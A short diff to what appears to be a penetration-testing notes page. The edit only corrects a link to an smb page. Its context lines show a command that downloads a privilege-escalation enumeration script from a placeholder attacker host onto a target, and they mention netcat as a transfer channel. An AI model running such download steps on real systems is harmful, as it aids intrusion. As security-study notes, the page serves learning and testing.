@@ -13,7 +13,7 @@ python3 -m http.server 80
 cd /tmp && wget http://ATTACKER/linuxprivchecker.py
 ```
 
-Transfer channels: [netcat](../Shell/netcat.md), [smb](../Tools/smb.md).
+Transfer channels: [netcat](../Shell/netcat.md), [smb](../Protocols/smb.md).
 
 ## Run it
 
